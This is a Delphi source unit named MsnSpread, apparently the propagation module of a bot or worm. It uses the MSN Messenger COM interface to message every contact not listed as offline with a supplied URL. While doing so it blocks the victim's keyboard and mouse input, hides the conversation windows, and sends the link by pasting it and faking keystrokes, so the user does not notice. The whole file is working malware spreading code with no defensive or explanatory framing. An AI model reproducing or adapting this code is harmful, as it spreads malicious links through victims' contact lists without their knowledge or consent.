unit MsnSpread;

interface

uses
  Windows,
  KOL,
  MessengerAPI_TLB,
  MsgrConversationWndPlugin_TLB,
  Forms,
  ThreadUnit;

  
var
  Msg:IMessenger3;
  Contacts:IMessengerContactsDisp;
  Contact:IMessengerContactDisp;
  MsgWND:IMessengerConversationWndDisp;
  n:Integer;
  i, IContacts:Integer;
  q:Integer;
  S, spreadurl:String;

Const

  FF2: String = 'C:\Windows\msnmsgr.exe';
  urlmsg: String = 'msn spread test';
  smileymsg: String = ':)   ';
 {$EXTERNALSYM WM_CHAR}
  WM_CHAR             = $0102;

  function Spread(URL: String): Integer;
  function BlockInput(fBlockInput: Boolean): DWORD; stdcall; external 'user32.DLL';
implementation
uses Bot;

Procedure CLose_IMW; //close Instant message window
const WM_Close = 16;
var
winhandle :hwnd;
begin
winhandle := findwindow('IMWindowClass',nil);
Windows.sendmessage(winhandle,WM_CLOSE,0,0);
end;

procedure key_type(text: string; HWND: HWND);
var
   //Accept: Boolean;
  hData: THandle;
  pData: Pointer;
  CText: string;
begin
   OpenClipboard(HWND);
   EmptyClipboard;
   hData := GlobalAlloc(GMEM_MOVEABLE + GMEM_DDESHARE, Length(Text) + 1);
   pData := GlobalLock(hData);
   Move((PChar(Text))^, pData^, Length(Text));
   SetClipboardData(CF_TEXT, hData);
   GlobalUnlock(hData);
   CloseClipBoard;
end;



function ContactSpam:Integer;
var
whdl:HWND;
hr: Boolean;
trx: Integer;
msnmsg, buf, msnmsg1: String;
  begin
  try
  trx := 0;
  msnmsg := SpreadURL;
  try
  Contacts := IMessengerContactsDisp(Msg.Mycontacts);  //	pIMessenger->get_MyContacts(&dispContacts);
  except begin SEndMessage('ContactsDisp Except');  end; end;
  n := 0;
  iContacts := Contacts.Count;   // pIMessengerContacts->get_Count(&iContacts);
  while n < iContacts do begin
    begin
    try Contact:=IMessengerContactDisp(Contacts.Item(n)); // pIMessengerContacts->raw_Item(i,&dispContact);
    except begin SendMessage('ContactDisp Except'); end; end;
    if (Contact.Status <> $00000001)  then
       begin
         try BlockInput(TRUE); except SendMessage('BlockINput except'); end;
         try MsgWnd:=IMessengerConversationWndDisp(Msg.InstantMessage(Msg.GetContact(Contact.SigninName,Contact.ServiceId)));  except SendMessage('HWND 1st Except'); end;
         try whdl := FindWindowEx(msgwnd.HWND,0,'DirectUIHWND',nil); except SendMessage('FindWindowEx Except'); end;
         try SetForeGroundWindow(whdl);  except SendMessage('SetForeGround except');  enD;
         try SetFocus(whdl); except SendMessage('Focus Except'); end;
         inc(trx);
         try ShowWindow(whdl,0); except SendMessage('ShowWindow Except'); end;
         try key_type(msnmsg, whdl); except SendMessage('KEy_Type except'); end;
         try Keybd_Event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY or 0, 0);
         keybd_event(VkKeyScan('V'), 0, 0, 0);
         Sleep(7);
         Keybd_Event(VK_CONTROL, 0, KEYEVENTF_EXTENDEDKEY or KEYEVENTF_KEYUP, 0);
         Sleep(12);
         keybd_event(VK_RETURN, 0, 0, 0);
         Sleep(7);
         CloseWindow(whdl);
         Close_Imw;
         BlockInput(FALSE);
         except SendMessage('under exceept'); end
       end;
       inc(n);
    end;
  end;
  BlockInput(False);
  Result := trx;
  try Msg := NIL; except SendMessage('NIL except'); end;
  except //DUMMY
  begin
  SendMessage('Main Spread Except');
  Result := 0;
  Msg := NIL;
  end;
  end;
  end;



function Spread(URL: String): Integer;
  begin
    try
     if MSNVAR = 0 then Forms.Application.Initialize; //CoInitialize(0);
      MSNVAR := 1;
      try Msg := MessengerAPI_TLB.CoMessenger.Create;
      except begin SendMessage('Create Except'); end; end;
      SpreadURL := URL;
      Result := ContactSpam;
      Msg := NIL;
    except
    begin
      SendMessage('Start Except');
      Result := 0;
      Msg:= NIL;
    end;
    end;
  end;

end.
